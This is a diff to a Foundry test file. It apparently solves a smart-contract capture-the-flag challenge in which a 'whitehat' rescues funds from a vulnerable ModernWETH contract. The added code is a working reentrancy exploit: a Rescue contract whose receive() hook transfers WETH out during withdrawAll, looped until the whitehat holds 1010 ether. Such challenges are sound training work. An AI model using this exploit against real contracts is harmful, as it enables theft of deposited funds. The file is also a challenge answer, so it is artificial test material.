@@ -39,9 +39,14 @@ contract Challenge2Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge2Test -vvvv //
         ////////////////////////////////////////////////////*/
+        Rescue rescue = new Rescue(address(modernWETH), whitehat);
 
+        while(address(whitehat).balance < 1010 ether){
+            rescue.attack{value:10 ether}();
+            modernWETH.withdrawAll();
+        }
 
-
+        
         //==================================================//
         vm.stopPrank();
 
@@ -49,4 +54,28 @@ contract Challenge2Test is Test {
         // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
         assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
     }
+}
+
+contract Rescue{
+    ModernWETH public modernWETH;
+    address whitehat;
+
+    constructor(address _target, address _wh){
+        modernWETH = ModernWETH(_target);
+        whitehat = _wh;
+    }
+
+    receive() external payable{
+        if(address(modernWETH).balance >= msg.value) {
+            modernWETH.transfer(whitehat, msg.value);
+            whitehat.call{value: address(this).balance}("");
+        }
+    }
+
+    function attack() public payable{
+        require(msg.sender == whitehat, "non");
+        modernWETH.deposit{value: msg.value}();
+        modernWETH.withdrawAll();
+    }
+
 }
